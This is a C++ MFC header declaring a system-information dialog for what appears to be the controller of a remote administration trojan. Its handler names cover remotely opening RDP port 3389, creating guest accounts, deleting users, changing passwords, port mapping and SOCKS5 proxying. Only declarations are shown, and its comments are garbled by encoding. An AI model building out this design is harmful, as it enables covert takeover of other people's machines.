
#pragma once

// SysInfo.h : header file
//
#include "ZXPortMap.h"

/////////////////////////////////////////////////////////////////////////////
// CSysInfo dialog

class CSysInfo : public CDialog
{
// Construction
public:
	CZXPortMap cPortMap;
	static DWORD WINAPI PortTransfer( LPVOID lparam );
	CSysInfo(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	CString IPAddress;
	CString m_strOperatingFile; // �ļ���
	__int64 m_nOperatingFileLength; // �ļ��ܴ�С
	__int64	m_nCounter;// ������
	CString m_strOperatingPath;
// Dialog Data
	//{{AFX_DATA(CSysInfo)
	enum { IDD = IDD_SYSINFO };
	CListCtrl	m_list_online;
	CListCtrl	m_list_wtsm;
	CListCtrl	m_list_sev;
	CTabCtrl	m_system_tab;
	CProgressCtrl	m_progress_3389;
	CListCtrl	m_list;
	CString	m_user;
	CString	m_pass;
	CString	m_admin;
	CString	m_port;
	CString	m_addr;
	int		m_nTheme;
	BOOL	m_socks5;
	CString	m_proxy_port;
	CString	m_proxy_user;
	CString	m_proxy_pass;
	BOOL	m_force;
	//}}AFX_DATA

private:
	void ShowSysinfoList();
	void ShowInstallList();
	void GetSysinfoList();
	void GetInstallinfoList();
	void GetSevList();
	void GetWtsmList();
	void ShowWtsList();
	void ShowSevList();
	void ShowSelectWindow();
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSysInfo)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	//}}AFX_VIRTUAL

// Implementation
protected:
	void ShowProgress();
	void SendFileData();
	void EndLocalUploadFile();
	BOOL SendUploadJob();
	tagSystemInfo m_SysInfo;
	tagOnlineInfo m_InsInfo;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CHeaderCtrl	m_header1;
	CHeaderCtrl	m_header2;
	CHeaderCtrl	m_header3;
	CHeaderCtrl	m_header4;
	void SortColumn1(int iCol, bool bAsc);
	void SortColumn2(int iCol, bool bAsc);
	void SortColumn3(int iCol, bool bAsc);
	void SortColumn4(int iCol, bool bAsc);
	int             m_nSortedCol1;
	bool            m_bAscending1;
	int             m_nSortedCol2;
	bool            m_bAscending2;
	int             m_nSortedCol3;
	bool            m_bAscending3;
	int             m_nSortedCol4;
	bool            m_bAscending4;
	// Generated message map functions
	//{{AFX_MSG(CSysInfo)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnCreat();
	afx_msg void OnGuest();
	afx_msg void OnStop();
	afx_msg void OnChange();
	afx_msg void OnConnect();
	afx_msg void OnProxy();
	afx_msg void OnSocks5();
	afx_msg void OnClose3389();
	afx_msg void OnOpen3389();
	afx_msg void OnLanConnect();
	afx_msg void OnSelchangeSystemTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickListSev(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRefreshpslist();
	afx_msg void OnDeluser();
	afx_msg void OnChangepassword();
	afx_msg void OnRclickListWts(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDisconnectUser();
	afx_msg void OnLogoffUser();
	afx_msg void OnCopy();
	afx_msg void OnRclickInfoList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnActiveUser();
	afx_msg void OnDisableuser();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
public:
	CImageList     m_ImgList;
};

